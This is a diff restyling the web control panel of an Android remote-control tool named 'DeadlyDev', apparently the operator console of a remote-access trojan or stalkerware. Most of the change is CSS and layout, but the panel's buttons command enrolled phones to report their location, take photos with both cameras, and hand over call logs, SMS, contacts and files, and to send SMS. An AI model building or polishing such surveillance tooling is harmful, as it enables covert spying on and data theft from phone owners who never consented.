@@ -6,39 +6,42 @@
 <title>DeadlyDev — Control Panel</title>
 <style>
 :root {
-  --bg:      #080809;
-  --bg2:     #0f0f12;
-  --bg3:     #181820;
-  --border:  #222230;
-  --border2: #30303f;
-  --accent:  #00e676;
-  --accentd: #003d1a;
-  --accentm: #00b050;
-  --text:    #e2e2e2;
-  --text2:   #7a7a8a;
-  --text3:   #3a3a4a;
-  --red:     #f44336;
-  --blue:    #2979ff;
+  --bg:       #0b0c0e;
+  --bg2:      #111318;
+  --bg3:      #191c23;
+  --bg4:      #1e2229;
+  --border:   #252830;
+  --border2:  #2e323d;
+  --accent:   #4ade80;
+  --accentd:  #052010;
+  --accentm:  #22c55e;
+  --text:     #d4d8e0;
+  --text2:    #6b7280;
+  --text3:    #374151;
+  --red:      #ef4444;
+  --blue:     #3b82f6;
+  --yellow:   #f59e0b;
 }
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;overflow:hidden}
-body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);
+body{font-family:'Inter','Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);
      display:flex;flex-direction:column;height:100dvh}
 
 /* NAV */
-nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 14px;
-    height:52px;display:flex;align-items:center;justify-content:space-between;
-    flex-shrink:0;z-index:100;box-shadow:0 1px 0 rgba(0,230,118,.06)}
+nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 16px;
+    height:54px;display:flex;align-items:center;justify-content:space-between;
+    flex-shrink:0;z-index:100}
 .nav-brand{display:flex;align-items:center;gap:10px}
-.nav-logo{width:34px;height:34px;border-radius:50%;object-fit:cover;
-          border:2px solid var(--accent);box-shadow:0 0 10px rgba(0,230,118,.35)}
-.nav-title{font-size:17px;font-weight:800;color:#fff;letter-spacing:.3px}
-.nav-title em{color:var(--accent);font-style:normal}
-#conn-pill{font-size:11px;padding:4px 11px;border-radius:20px;font-weight:700;
-           white-space:nowrap;transition:all .3s}
-#conn-pill.on{color:var(--accent);border:1px solid var(--accent);
-              background:rgba(0,230,118,.08);box-shadow:0 0 8px rgba(0,230,118,.2)}
-#conn-pill.off{color:var(--red);border:1px solid #f4433640;background:rgba(244,67,54,.06)}
+.nav-icon{width:30px;height:30px;border-radius:8px;background:var(--accentd);
+          border:1px solid var(--accentm);display:flex;align-items:center;justify-content:center;
+          font-size:15px;flex-shrink:0}
+.nav-title{font-size:16px;font-weight:700;color:#fff;letter-spacing:.2px}
+.nav-title span{color:var(--accent)}
+.nav-right{display:flex;align-items:center;gap:10px}
+#conn-pill{font-size:11px;padding:4px 12px;border-radius:20px;font-weight:600;
+           white-space:nowrap;transition:all .3s;letter-spacing:.3px}
+#conn-pill.on{color:var(--accent);border:1px solid var(--accentm);background:var(--accentd)}
+#conn-pill.off{color:var(--red);border:1px solid #7f1d1d;background:#1c0606}
 
 /* BOTTOM TAB BAR — mobile */
 .tabs{display:none;background:var(--bg2);border-top:1px solid var(--border);
@@ -46,82 +49,88 @@ nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 14px;
 .tabs button{flex:1;padding:8px 2px 6px;background:none;border:none;color:var(--text3);
              font-size:10px;cursor:pointer;display:flex;flex-direction:column;
              align-items:center;gap:2px;transition:color .2s;min-width:0}
-.tabs button .ti{font-size:20px;line-height:1}
+.tabs button .ti{font-size:19px;line-height:1}
 .tabs button.act{color:var(--accent)}
-.tabs button .bar{width:28px;height:2px;border-radius:2px;background:transparent;margin-top:2px}
+.tabs button .bar{width:24px;height:2px;border-radius:2px;background:transparent;margin-top:2px}
 .tabs button.act .bar{background:var(--accent)}
 
 /* LAYOUT */
 .layout{display:flex;flex:1;overflow:hidden}
 
 /* SIDEBAR */
-.sidebar{width:250px;min-width:250px;background:var(--bg2);
+.sidebar{width:240px;min-width:240px;background:var(--bg2);
          border-right:1px solid var(--border);display:flex;
          flex-direction:column;flex-shrink:0;overflow-y:auto}
-.sb-head{padding:14px 14px 6px;font-size:10px;text-transform:uppercase;
-         letter-spacing:1.5px;color:var(--text3)}
+.sb-head{padding:14px 14px 8px;font-size:9px;text-transform:uppercase;
+         letter-spacing:1.8px;color:var(--text3);font-weight:600}
 #dev-list{padding:0 8px 8px;flex:1}
-.dcard{padding:11px 12px;border-radius:10px;margin-bottom:6px;cursor:pointer;
+.dcard{padding:11px 12px;border-radius:10px;margin-bottom:5px;cursor:pointer;
        border:1px solid transparent;transition:all .15s;position:relative}
-.dcard:active{transform:scale(.98)}
-.dcard.sel{background:#06180e;border-color:var(--accent);
-           box-shadow:0 0 14px rgba(0,230,118,.12)}
-.dcard:not(.sel):hover{background:var(--bg3)}
-.dcard .dn{font-size:13px;font-weight:700;color:#fff}
+.dcard:active{transform:scale(.97)}
+.dcard.sel{background:#06150c;border-color:var(--accentm)}
+.dcard:not(.sel):hover{background:var(--bg3);border-color:var(--border2)}
+.dcard .dn{font-size:13px;font-weight:600;color:#fff}
 .dcard .di{font-size:11px;color:var(--text2);margin-top:2px}
-.dcard .ds{display:flex;align-items:center;gap:6px;margin-top:5px}
+.dcard .ds{display:flex;align-items:center;gap:6px;margin-top:6px}
 .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
-.dot.on{background:var(--accent);box-shadow:0 0 6px rgba(0,230,118,.6);animation:blink 2s infinite}
-.dot.off{background:var(--red)}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
-.ds-lbl{font-size:11px}
+.dot.on{background:var(--accent);box-shadow:0 0 6px rgba(74,222,128,.5);animation:blink 2.5s infinite}
+.dot.off{background:var(--red);box-shadow:0 0 4px rgba(239,68,68,.3)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.35}}
+.ds-lbl{font-size:11px;font-weight:500}
 .ds-lbl.on{color:var(--accent)} .ds-lbl.off{color:var(--red)}
 .ds-bat{font-size:11px;color:var(--text2);margin-left:auto}
-.no-dev{color:var(--text3);font-size:12px;text-align:center;padding:32px 14px;
-        line-height:1.8}
-.wsbox{margin:8px;padding:10px 12px;background:var(--accentd);
-       border:1px solid var(--accentm);border-radius:8px}
+.no-dev{color:var(--text3);font-size:12px;text-align:center;padding:32px 16px;line-height:1.9}
+.wsbox{margin:8px;padding:11px 13px;background:var(--accentd);
+       border:1px solid #16532d;border-radius:10px}
 .wsbox .wsl{font-size:9px;color:var(--accentm);text-transform:uppercase;
-            letter-spacing:.5px;margin-bottom:4px}
+            letter-spacing:.8px;margin-bottom:5px;font-weight:600}
 .wsbox .wsu{font-size:10px;color:var(--accent);word-break:break-all;
-            font-family:monospace;cursor:pointer}
-.wsbox .wsh{font-size:10px;color:var(--text2);margin-top:5px;line-height:1.4}
+            font-family:'Fira Code',monospace;cursor:pointer;line-height:1.5}
+.wsbox .wsh{font-size:10px;color:var(--text2);margin-top:6px}
 
 /* MAIN */
 .main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
 
 /* WAITING SCREEN */
 #wait-screen{flex:1;display:flex;flex-direction:column;align-items:center;
-             justify-content:center;gap:18px;padding:32px;text-align:center}
-#wait-screen .ws-icon{font-size:52px;animation:float 3s ease-in-out infinite}
+             justify-content:center;gap:20px;padding:40px;text-align:center}
+#wait-screen .ws-icon{font-size:48px;animation:float 3.5s ease-in-out infinite}
 @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
-#wait-screen .ws-title{font-size:20px;font-weight:800;color:#fff}
-#wait-screen .ws-sub{font-size:13px;color:var(--text2);line-height:1.6;max-width:280px}
-#wait-screen .ws-url-box{background:var(--accentd);border:1px solid var(--accentm);
-                          border-radius:10px;padding:12px 16px;max-width:320px;width:100%;
-                          font-family:monospace;font-size:11px;color:var(--accent);
-                          word-break:break-all;cursor:pointer;text-align:left}
-#wait-screen .ws-url-label{font-size:9px;color:var(--accentm);text-transform:uppercase;
-                            letter-spacing:1px;margin-bottom:5px}
-.spinner{width:36px;height:36px;border:3px solid var(--border);
+#wait-screen .ws-title{font-size:22px;font-weight:700;color:#fff}
+#wait-screen .ws-sub{font-size:13px;color:var(--text2);line-height:1.7;max-width:290px}
+.spinner{width:32px;height:32px;border:2px solid var(--border2);
          border-top-color:var(--accent);border-radius:50%;animation:spin 1s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
+#wait-url-box{background:var(--bg2);border:1px solid var(--border2);border-radius:10px;
+              padding:13px 16px;max-width:340px;width:100%;text-align:left;cursor:pointer}
+#wait-url-box:hover{border-color:var(--accentm)}
+.wu-label{font-size:9px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;
+          margin-bottom:6px;font-weight:600}
+#wait-url{font-family:'Fira Code',monospace;font-size:11px;color:var(--accent);
+          word-break:break-all;line-height:1.5}
+.wu-hint{font-size:10px;color:var(--text3);margin-top:6px}
 
 /* CTRL PANEL */
 #ctrl-screen{flex:1;display:none;flex-direction:column;overflow:hidden}
-.cp-head{padding:11px 14px 10px;border-bottom:1px solid var(--border);flex-shrink:0}
-.cp-dev{font-size:12px;color:var(--text2);margin-bottom:8px}
-.cp-dev strong{color:var(--accent);font-weight:700}
-.cmd-grid{display:flex;flex-wrap:wrap;gap:6px}
-.cb{padding:8px 13px;background:var(--bg3);border:1px solid var(--border2);
-    border-radius:9px;color:var(--text);font-size:12px;cursor:pointer;
+.cp-head{padding:12px 14px;border-bottom:1px solid var(--border);flex-shrink:0;
+         background:var(--bg2)}
+.cp-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+.cp-dev-info{display:flex;align-items:center;gap:8px}
+.cp-dev-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.cp-dev-name{font-size:13px;font-weight:600;color:#fff}
+.cp-dev-sub{font-size:11px;color:var(--text2)}
+.cmd-grid{display:flex;flex-wrap:wrap;gap:5px}
+.cb{padding:7px 12px;background:var(--bg3);border:1px solid var(--border2);
+    border-radius:8px;color:var(--text);font-size:12px;cursor:pointer;
     transition:all .15s;white-space:nowrap;display:flex;align-items:center;
-    gap:5px;touch-action:manipulation;font-family:inherit;-webkit-appearance:none}
-.cb:active{transform:scale(.95)}
-.cb:hover{background:#1e1e2a;border-color:var(--accent);color:#fff}
-.cb.green{background:var(--accentd);border-color:var(--accent);
-          color:var(--accent);font-weight:700}
-.cb.green:hover{background:#005c22}
+    gap:5px;touch-action:manipulation;font-family:inherit;-webkit-appearance:none;
+    font-weight:500}
+.cb:active{transform:scale(.94)}
+.cb:hover{background:var(--bg4);border-color:var(--accent);color:#fff}
+.cb.green{background:var(--accentd);border-color:var(--accentm);color:var(--accent);font-weight:600}
+.cb.green:hover{background:#0a3520}
+.cb.red-btn{background:#1c0606;border-color:#7f1d1d;color:#fca5a5}
+.cb.red-btn:hover{background:#2d0808;border-color:var(--red)}
 
 /* SMS FORM */
 #sms-form{display:none;background:var(--bg3);border:1px solid var(--border2);
@@ -130,109 +139,126 @@ nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 14px;
 #sms-form input,#sms-form textarea{background:var(--bg);border:1px solid var(--border2);
   border-radius:7px;color:#fff;padding:8px 11px;font-size:13px;outline:none;
   width:100%;font-family:inherit}
-#sms-form input:focus,#sms-form textarea:focus{border-color:var(--accent)}
-#sms-form textarea{resize:vertical;min-height:58px}
+#sms-form input:focus,#sms-form textarea:focus{border-color:var(--accentm)}
+#sms-form textarea{resize:vertical;min-height:60px}
 .sms-row{display:flex;gap:7px}
-.sms-send{background:var(--accent);border:none;border-radius:7px;color:#000;
-          padding:8px 16px;font-size:13px;cursor:pointer;font-weight:800;flex:1;font-family:inherit}
-.sms-cancel{background:var(--border2);border:none;border-radius:7px;color:var(--text);
-            padding:8px 12px;font-size:13px;cursor:pointer;font-family:inherit}
+.sms-send{background:var(--accentm);border:none;border-radius:7px;color:#000;
+          padding:8px 16px;font-size:13px;cursor:pointer;font-weight:700;flex:1;font-family:inherit}
+.sms-send:hover{background:var(--accent)}
+.sms-cancel{background:var(--bg4);border:1px solid var(--border2);border-radius:7px;
+            color:var(--text);padding:8px 12px;font-size:13px;cursor:pointer;font-family:inherit}
 
-/* RESULTS */
+/* RESULTS AREA */
 #results{flex:1;overflow-y:auto;padding:10px;display:flex;
-         flex-direction:column;gap:8px;-webkit-overflow-scrolling:touch}
-.ri{background:var(--bg2);border:1px solid var(--border);border-radius:11px;
+         flex-direction:column;gap:7px;-webkit-overflow-scrolling:touch}
+
+/* RESULT CARD */
+.ri{background:var(--bg2);border:1px solid var(--border);border-radius:12px;
     overflow:hidden;flex-shrink:0}
-.rh{padding:7px 12px;background:var(--bg3);font-size:11px;color:var(--text2);
+.rh{padding:8px 12px;background:var(--bg3);font-size:11px;color:var(--text2);
     display:flex;justify-content:space-between;align-items:center;gap:8px;
     border-bottom:1px solid var(--border)}
-.rh .rt{color:var(--accent);font-weight:700;font-size:11px}
+.rh .rt{color:var(--accent);font-weight:600;font-size:11px;display:flex;
+        align-items:center;gap:5px}
+.rh .rtime{font-size:10px;color:var(--text3)}
 .rb{padding:10px 12px}
-.rb pre{white-space:pre-wrap;word-break:break-word;font-family:monospace;
-        font-size:12px;color:#ccc;line-height:1.5;max-height:280px;overflow-y:auto}
-.rb img{max-width:100%;max-height:320px;border-radius:7px;display:block}
+.rb pre{white-space:pre-wrap;word-break:break-word;font-family:'Fira Code',monospace;
+        font-size:11.5px;color:#c4c8d4;line-height:1.6;max-height:260px;overflow-y:auto}
+.rb img{max-width:100%;max-height:320px;border-radius:8px;display:block}
 .dl-link{display:inline-flex;align-items:center;gap:7px;background:var(--accentd);
-         border:1px solid var(--accent);border-radius:7px;padding:7px 14px;
-         color:var(--accent);text-decoration:none;font-size:13px;cursor:pointer;
-         margin-top:4px;font-weight:600}
-.dl-link:hover{background:#005c22}
-.map-link{display:inline-flex;align-items:center;gap:6px;background:#06180e;
-          border:1px solid var(--accent);border-radius:7px;padding:7px 14px;
-          color:var(--accent);text-decoration:none;font-size:13px;margin-top:8px}
-.loc-pre{font-size:12px;color:#aaa;margin-bottom:6px;line-height:1.4}
+         border:1px solid var(--accentm);border-radius:7px;padding:7px 14px;
+         color:var(--accent);text-decoration:none;font-size:12px;cursor:pointer;
+         margin-top:6px;font-weight:600;transition:all .15s}
+.dl-link:hover{background:#0a3520}
+.map-link{display:inline-flex;align-items:center;gap:6px;background:var(--accentd);
+          border:1px solid var(--accentm);border-radius:7px;padding:7px 14px;
+          color:var(--accent);text-decoration:none;font-size:12px;margin-top:8px;
+          font-weight:600;transition:all .15s}
+.map-link:hover{background:#0a3520}
+.loc-pre{font-size:12px;color:#9ca3af;margin-bottom:6px;line-height:1.5}
 
 /* FILE MANAGER */
-.fm-path{font-size:11px;color:var(--accent);font-family:monospace;margin-bottom:7px}
+.fm-path{font-size:11px;color:var(--accent);font-family:monospace;margin-bottom:8px;
+         background:var(--bg3);padding:6px 10px;border-radius:6px;border:1px solid var(--border)}
 .fm-back{display:inline-flex;align-items:center;gap:5px;background:var(--bg3);
-         border:1px solid var(--border2);border-radius:7px;padding:5px 10px;
-         color:var(--text2);font-size:11px;cursor:pointer;margin-bottom:7px}
-.fm-back:hover{border-color:var(--accent);color:var(--accent)}
-.fm-list{display:flex;flex-direction:column;gap:3px;max-height:320px;overflow-y:auto}
-.fmi{display:flex;align-items:center;gap:8px;padding:7px 10px;background:var(--bg3);
+         border:1px solid var(--border2);border-radius:7px;padding:5px 11px;
+         color:var(--text2);font-size:11px;cursor:pointer;margin-bottom:8px;
+         transition:all .15s}
+.fm-back:hover{border-color:var(--accentm);color:var(--accent)}
+.fm-list{display:flex;flex-direction:column;gap:3px;max-height:340px;overflow-y:auto}
+.fmi{display:flex;align-items:center;gap:9px;padding:8px 10px;background:var(--bg3);
      border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:all .15s}
 .fmi:active{transform:scale(.98)}
-.fmi:hover{border-color:var(--accent);background:#06180e}
+.fmi:hover{border-color:var(--accentm);background:var(--bg4)}
 .fmi .fi{font-size:16px;flex-shrink:0;width:22px;text-align:center}
-.fmi .fn{font-size:12px;color:#ddd;flex:1;word-break:break-all}
+.fmi .fn{font-size:12px;color:#e2e8f0;flex:1;word-break:break-all}
 .fmi .fs{font-size:10px;color:var(--text3);white-space:nowrap}
-.fmi .fdl{background:var(--accentd);border:1px solid var(--accent);color:var(--accent);
+.fmi .fdl{background:var(--accentd);border:1px solid var(--accentm);color:var(--accent);
           border-radius:6px;padding:3px 9px;font-size:10px;cursor:pointer;
-          white-space:nowrap;font-weight:700}
-.fm-empty{color:var(--text3);font-size:12px;text-align:center;padding:14px}
+          white-space:nowrap;font-weight:600;transition:all .15s}
+.fmi .fdl:hover{background:#0a3520}
+.fm-empty{color:var(--text3);font-size:12px;text-align:center;padding:16px}
 
-/* CONTACTS / MESSAGES */
+/* CONTACTS / MESSAGES PANEL */
 .dp{padding:10px 12px}
 .dp-top{display:flex;align-items:flex-start;justify-content:space-between;
-        margin-bottom:8px;gap:8px;flex-wrap:wrap}
-.dp-info .dp-title{font-size:13px;font-weight:800;color:var(--accent)}
-.dp-info .dp-count{font-size:11px;color:var(--text2)}
+        margin-bottom:9px;gap:8px;flex-wrap:wrap}
+.dp-info .dp-title{font-size:13px;font-weight:700;color:#fff}
+.dp-info .dp-count{font-size:11px;color:var(--text2);margin-top:2px}
 .dp-actions{display:flex;gap:6px;flex-shrink:0}
-.dl-btn{display:flex;align-items:center;gap:5px;background:var(--accentd);
-        border:1px solid var(--accent);color:var(--accent);border-radius:7px;
-        padding:6px 13px;font-size:11px;cursor:pointer;font-weight:700;border:1px solid var(--accent)}
-.dl-btn:hover{background:#005c22}
-.srch{width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:7px;
-      color:#fff;padding:7px 11px;font-size:12px;outline:none;margin-bottom:8px;font-family:inherit}
-.srch:focus{border-color:var(--accent)}
-.tbl-wrap{max-height:320px;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.dp-btn{display:flex;align-items:center;gap:5px;background:var(--accentd);
+        border:1px solid var(--accentm);color:var(--accent);border-radius:7px;
+        padding:5px 12px;font-size:11px;cursor:pointer;font-weight:600;
+        transition:all .15s}
+.dp-btn:hover{background:#0a3520}
+.dp-btn.gray{background:var(--bg3);border-color:var(--border2);color:var(--text2)}
+.dp-btn.gray:hover{border-color:var(--accent);color:var(--accent)}
+.srch{width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:8px;
+      color:#fff;padding:8px 12px;font-size:12px;outline:none;margin-bottom:8px;
+      font-family:inherit}
+.srch:focus{border-color:var(--accentm)}
+.tbl-wrap{max-height:340px;overflow-y:auto;-webkit-overflow-scrolling:touch}
 table.ct{width:100%;border-collapse:collapse;font-size:12px}
-table.ct th{text-align:left;padding:6px 8px;color:var(--text3);font-size:10px;
-            text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid var(--border)}
+table.ct th{text-align:left;padding:7px 8px;color:var(--text3);font-size:10px;
+            text-transform:uppercase;letter-spacing:.8px;border-bottom:1px solid var(--border);
+            font-weight:600}
 table.ct td{padding:7px 8px;border-bottom:1px solid var(--border);
             color:var(--text);vertical-align:top;word-break:break-word}
+table.ct tr:last-child td{border-bottom:none}
 table.ct tr:hover td{background:var(--bg3)}
-table.ct td.cn{font-weight:700;color:#fff}
+table.ct td.cn{font-weight:600;color:#f1f5f9}
 table.ct td.cp{color:var(--accent);font-family:monospace;font-size:11px}
 table.ct td.ce{color:var(--text2);font-size:11px}
-.msg-item{padding:8px 10px;background:var(--bg3);border:1px solid var(--border);
-          border-radius:9px;margin-bottom:5px}
+.msg-item{padding:9px 10px;background:var(--bg3);border:1px solid var(--border);
+          border-radius:9px;margin-bottom:4px;transition:border-color .15s}
+.msg-item:hover{border-color:var(--border2)}
 .msg-hd{display:flex;justify-content:space-between;align-items:center;
-        margin-bottom:3px;flex-wrap:wrap;gap:4px}
-.msg-fr{font-size:12px;font-weight:700;color:#fff}
-.msg-badge{font-size:9px;padding:2px 7px;border-radius:10px;font-weight:700}
-.msg-badge.in{background:var(--accentd);color:var(--accent)}
-.msg-badge.sn{background:#0d1f3a;color:var(--blue)}
+        margin-bottom:4px;flex-wrap:wrap;gap:4px}
+.msg-fr{font-size:12px;font-weight:600;color:#f1f5f9}
+.msg-badge{font-size:9px;padding:2px 7px;border-radius:10px;font-weight:700;letter-spacing:.3px}
+.msg-badge.in{background:var(--accentd);color:var(--accent);border:1px solid #16532d}
+.msg-badge.sn{background:#0d1f3a;color:var(--blue);border:1px solid #1e3a5f}
 .msg-dt{font-size:10px;color:var(--text3)}
-.msg-bd{font-size:12px;color:#bbb;line-height:1.4;margin-top:2px}
-.msg-list{max-height:320px;overflow-y:auto;display:flex;flex-direction:column;
+.msg-bd{font-size:12px;color:#9ca3af;line-height:1.5;margin-top:3px}
+.msg-list{max-height:340px;overflow-y:auto;display:flex;flex-direction:column;
           gap:4px;-webkit-overflow-scrolling:touch}
-.empty-st{text-align:center;padding:24px;color:var(--text3);font-size:12px}
-.empty-st .eico{font-size:32px;margin-bottom:8px}
+.empty-st{text-align:center;padding:28px;color:var(--text3);font-size:12px}
+.empty-st .eico{font-size:30px;margin-bottom:8px}
 
 /* SCROLLBAR */
 ::-webkit-scrollbar{width:4px;height:4px}
 ::-webkit-scrollbar-track{background:transparent}
-::-webkit-scrollbar-thumb{background:#2a2a3a;border-radius:2px}
-::-webkit-scrollbar-thumb:hover{background:var(--accentm)}
+::-webkit-scrollbar-thumb{background:#262932;border-radius:2px}
+::-webkit-scrollbar-thumb:hover{background:#374151}
 
 /* OVERLAY */
-#overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:150}
+#overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:150}
 
 /* MOBILE */
 @media(max-width:640px){
   .tabs{display:flex}
   .sidebar{position:fixed;left:0;top:0;bottom:0;z-index:200;width:82vw;max-width:300px;
-           transform:translateX(-100%);box-shadow:6px 0 30px rgba(0,0,0,.6);
+           transform:translateX(-100%);box-shadow:8px 0 32px rgba(0,0,0,.7);
            transition:transform .25s ease}
   .sidebar.open{transform:translateX(0)}
   #overlay.show{display:block}
@@ -244,13 +270,15 @@ table.ct td.ce{color:var(--text2);font-size:11px}
 <!-- NAV -->
 <nav>
   <div class="nav-brand">
-    <img src="/deadlydev.jpg" class="nav-logo" alt="DD" onerror="this.style.display='none'">
-    <div class="nav-title"><em>Deadly</em>Dev</div>
+    <div class="nav-icon">🕹</div>
+    <div class="nav-title">Deadly<span>Dev</span></div>
   </div>
-  <div id="conn-pill" class="off">⬤ Offline</div>
+  <div class="nav-right">
+    <div id="conn-pill" class="off">● Offline</div>
+  </div>
 </nav>
 
-<!-- OVERLAY (mobile sidebar close) -->
+<!-- OVERLAY -->
 <div id="overlay" onclick="closeSb()"></div>
 
 <div class="layout">
@@ -260,15 +288,15 @@ table.ct td.ce{color:var(--text2);font-size:11px}
     <div class="sb-head">Connected Devices</div>
     <div id="dev-list">
       <div class="no-dev">
-        <div style="font-size:32px;margin-bottom:10px">📱</div>
+        <div style="font-size:34px;margin-bottom:12px">📱</div>
         No devices yet.<br>Install the APK and open it.
       </div>
     </div>
     <div id="wsbox" style="display:none">
       <div class="wsbox">
-        <div class="wsl">WebSocket URL (copy to app)</div>
+        <div class="wsl">WebSocket URL</div>
         <div class="wsu" id="wsu" onclick="copyUrl()">—</div>
-        <div class="wsh">Tap to copy · Set this URL in the Android app</div>
+        <div class="wsh">Tap to copy · Set in Android app</div>
       </div>
     </div>
   </div>
@@ -276,33 +304,41 @@ table.ct td.ce{color:var(--text2);font-size:11px}
   <!-- MAIN -->
   <div class="main" id="main">
 
-    <!-- WAITING SCREEN (shown until device selected) -->
+    <!-- WAITING -->
     <div id="wait-screen">
       <div class="ws-icon">📡</div>
       <div class="ws-title">Waiting for device…</div>
       <div class="ws-sub">Open the DeadlyDev app on your Android phone. It will connect automatically.</div>
       <div class="spinner"></div>
-      <div id="wait-url-box" style="display:none">
-        <div class="ws-url-label">App WebSocket URL</div>
-        <div id="wait-url" style="font-family:monospace;font-size:11px;color:var(--accent);word-break:break-all;margin-top:4px;cursor:pointer" onclick="copyUrl()">—</div>
-        <div style="font-size:10px;color:var(--text2);margin-top:6px">Tap to copy · Set in Android app config</div>
+      <div id="wait-url-box" style="display:none" onclick="copyUrl()">
+        <div class="wu-label">App WebSocket URL</div>
+        <div id="wait-url">—</div>
+        <div class="wu-hint">Tap to copy · Set this in Android app config</div>
       </div>
     </div>
 
-    <!-- CONTROL SCREEN (shown when device selected) -->
+    <!-- CONTROL SCREEN -->
     <div id="ctrl-screen">
       <div class="cp-head">
-        <div class="cp-dev">Device: <strong id="sel-name">—</strong></div>
+        <div class="cp-top">
+          <div class="cp-dev-info">
+            <div class="cp-dev-dot dot on" id="cp-dot"></div>
+            <div>
+              <div class="cp-dev-name" id="sel-name">—</div>
+              <div class="cp-dev-sub" id="sel-sub">No device</div>
+            </div>
+          </div>
+        </div>
         <div class="cmd-grid">
           <button class="cb" onclick="sc('get_location')">📍 Location</button>
           <button class="cb" onclick="sc('capture_back')">📷 Camera</button>
           <button class="cb" onclick="sc('capture_front')">🤳 Selfie</button>
-          <button class="cb" onclick="sc('get_call_log')">📞 Calls</button>
+          <button class="cb" onclick="sc('get_call_log')">📞 Call Log</button>
           <button class="cb" onclick="sc('get_sms')">💬 SMS File</button>
           <button class="cb" onclick="sc('get_contacts')">👥 Contacts File</button>
-          <button class="cb green" onclick="loadContacts()">👥 View Contacts</button>
-          <button class="cb green" onclick="loadMessages()">💬 View Messages</button>
-          <button class="cb" onclick="sc('list_files',{path:''})">📁 Files</button>
+          <button class="cb green" onclick="loadContacts()">📋 View Contacts</button>
+          <button class="cb green" onclick="loadMessages()">📨 View SMS</button>
+          <button class="cb" onclick="sc('list_files',{path:''})">📁 File Manager</button>
           <button class="cb" onclick="toggleSms()">✉️ Send SMS</button>
         </div>
         <div id="sms-form">
@@ -339,8 +375,17 @@ table.ct td.ce{color:var(--text2);font-size:11px}
 <script>
 // ── State
 let ws = null, wsUrl = '', selId = null;
-const devs = {}, cache = {}; // cache[id] = { contacts, messages }
+const devs = {}, cache = {};
 const isMob = () => window.innerWidth <= 640;
+
+// Panel IDs — only one visible at a time
+const PANEL_IDS = ['fm-card','contacts-card','msg-card'];
+
+function removeOtherPanels(keepId) {
+  PANEL_IDS.forEach(id => {
+    if (id !== keepId) document.getElementById(id)?.remove();
+  });
+}
 
 // ── Boot
 (async () => {
@@ -373,7 +418,7 @@ function connect() {
 
 function setConn(on) {
   const p = document.getElementById('conn-pill');
-  p.textContent = on ? '⬤ Online' : '⬤ Offline';
+  p.textContent = on ? '● Online' : '● Offline';
   p.className = on ? 'on' : 'off';
 }
 
@@ -398,11 +443,11 @@ function handle(m) {
     case 'device_update':
       if (devs[m.deviceId]) { devs[m.deviceId].battery = m.battery; renderDevs(); }
       break;
-    case 'response':   if (m.deviceId===selId) addText(m.data); break;
-    case 'photo':      if (m.deviceId===selId) addPhoto(m); break;
-    case 'file':       if (m.deviceId===selId) addFile(m); break;
-    case 'location':   if (m.deviceId===selId) addLoc(m); break;
-    case 'file_list':  if (m.deviceId===selId) addFm(m); break;
+    case 'response':  if (m.deviceId===selId) addText(m.data); break;
+    case 'photo':     if (m.deviceId===selId) addPhoto(m); break;
+    case 'file':      if (m.deviceId===selId) addFile(m); break;
+    case 'location':  if (m.deviceId===selId) addLoc(m); break;
+    case 'file_list': if (m.deviceId===selId) addFm(m); break;
     case 'contacts_data':
       if (!cache[m.deviceId]) cache[m.deviceId] = {};
       cache[m.deviceId].contacts = m.contacts || [];
@@ -421,18 +466,18 @@ function renderDevs() {
   const el = document.getElementById('dev-list');
   const ids = Object.keys(devs);
   if (!ids.length) {
-    el.innerHTML = '<div class="no-dev"><div style="font-size:32px;margin-bottom:10px">📱</div>No devices yet.<br>Install the APK and open it.</div>';
+    el.innerHTML = '<div class="no-dev"><div style="font-size:34px;margin-bottom:12px">📱</div>No devices yet.<br>Install the APK and open it.</div>';
     return;
   }
   el.innerHTML = ids.map(id => {
     const d = devs[id], on = d.isOnline !== false;
-    return `<div class="dcard${id===selId?' sel':''}" onclick="pickDev('${id}')">
+    return `<div class="dcard${id===selId?' sel':''}" onclick="pickDev('${x(id)}')">
       <div class="dn">${x(d.deviceName||'Unknown')}</div>
-      <div class="di">Android ${d.androidVersion||'?'} · ${d.network||'?'}</div>
+      <div class="di">Android ${x(d.androidVersion||'?')} · ${x(d.network||'?')}</div>
       <div class="ds">
         <div class="dot ${on?'on':'off'}"></div>
         <span class="ds-lbl ${on?'on':'off'}">${on?'Online':'Offline'}</span>
-        <span class="ds-bat">🔋${d.battery||0}%</span>
+        <span class="ds-bat">🔋 ${d.battery||0}%</span>
       </div></div>`;
   }).join('');
 }
@@ -440,18 +485,24 @@ function renderDevs() {
 function pickDev(id) {
   selId = id;
   renderDevs();
-  document.getElementById('sel-name').textContent = devs[id]?.deviceName || id;
+  const d = devs[id] || {};
+  const on = d.isOnline !== false;
+  document.getElementById('sel-name').textContent = d.deviceName || id;
+  document.getElementById('sel-sub').textContent =
+    `Android ${d.androidVersion||'?'} · ${d.network||'?'} · 🔋 ${d.battery||0}%`;
+  const dot = document.getElementById('cp-dot');
+  dot.className = 'cp-dev-dot dot ' + (on ? 'on' : 'off');
   document.getElementById('results').innerHTML = '';
   document.getElementById('wait-screen').style.display = 'none';
-  document.getElementById('ctrl-screen').style.display = 'flex';
-  document.getElementById('ctrl-screen').style.flexDirection = 'column';
+  const cs = document.getElementById('ctrl-screen');
+  cs.style.display = 'flex';
+  cs.style.flexDirection = 'column';
